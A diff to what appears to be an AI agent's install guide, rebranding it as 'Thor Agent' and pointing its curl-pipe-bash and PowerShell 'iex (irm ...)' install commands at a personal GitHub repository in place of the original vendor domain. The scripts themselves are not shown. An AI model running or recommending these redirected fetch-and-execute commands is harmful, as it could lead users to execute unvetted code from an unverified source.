@@ -52,7 +52,7 @@ Pick the row that matches your goal:
 
 ## 1. Install Thor Agent
 ### With the Thor Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Thor Desktop installer](https://thor-agent.nousresearch.com/) from our website and run it.
+To easily install the command-line and desktop applications, [download the Thor Desktop installer](https://thor-agent.thor-agent.local/) from our website and run it.
 
 ### Without Thor Desktop:
 For a command-line only install without Thor Desktop, run:
@@ -61,14 +61,14 @@ For aarch64 Android devices, use the separate [Termux APT guide](./termux.md).
 
 #### Linux / macOS / WSL2
 ```bash
-curl -fsSL https://thor-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://thor-agent.nousresearch.com/install.ps1) 
+iex (irm https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.ps1) 
 ```
 
 After it finishes, reload your shell:
@@ -87,14 +87,14 @@ The single most important setup step. Use `thor model` to walk through the choic
 thor model
 ```
 
-:::tip Easiest path: Nous Portal
+:::tip Easiest path: Thor Portal
 One subscription covers 300+ models plus the [Tool Gateway](../user-guide/features/tool-gateway.md) (web search, image generation, TTS, cloud browser). On a fresh install:
 
 ```bash
 thor setup --portal
 ```
 
-That logs you in, sets Nous as your provider, and turns on the Tool Gateway in one command.
+That logs you in, sets Thor as your provider, and turns on the Tool Gateway in one command.
 :::
 
 :::info Setup modes
@@ -102,7 +102,7 @@ Coming from OpenClaw, Claude Code, Codex CLI or Cursor? When a fresh `thor setup
 
 On a fresh install, `thor setup` offers three modes:
 
-- **Quick Setup (Nous Portal)** — OAuth login, no API keys to manage; sets up a model plus the Tool Gateway tools, billed to your [Nous Portal subscription](../integrations/nous-portal.md). The recommended fast path.
+- **Quick Setup (Thor Portal)** — OAuth login, no API keys to manage; sets up a model plus the Tool Gateway tools, billed to your [Thor Portal subscription](../integrations/thor-portal.md). The recommended fast path.
 - **Full Setup** — walk through every provider, tool, and option yourself (bring your own keys).
 - **Blank Slate** — everything starts **off** except the bare minimum needed to run an agent: **provider & model, the File Operations toolset, and the Terminal toolset**. No web, browser, code execution, vision, memory, delegation, cron, skills, plugins, or MCP servers — and compression, checkpoints, smart routing, and memory capture are all disabled. After the minimal baseline is applied, you choose one of two paths: **start with everything disabled** (finish now with the minimal agent), or **walk through all configurations** (opt in to tools, skills, plugins, MCP, and messaging). Pick this when you want a minimal, fully-controlled agent and intend to enable only exactly what you need.
 
@@ -113,7 +113,7 @@ Good defaults:
 
 | Provider | What it is | How to set up |
 |----------|-----------|---------------|
-| **Nous Portal** | Subscription-based, zero-config | OAuth login via `thor model` |
+| **Thor Portal** | Subscription-based, zero-config | OAuth login via `thor model` |
 | **OpenAI Codex** | ChatGPT or Codex subscription, uses Codex models | Device code auth via `thor model` → **ChatGPT or Codex Subscription** |
 | **Anthropic** | Claude models directly — Max plan + extra usage credits (OAuth), or API key for pay-per-token | `thor model` → OAuth login (requires Max + extra credits), or an Anthropic API key |
 | **OpenRouter** | Multi-provider routing across many models | Enter your API key |
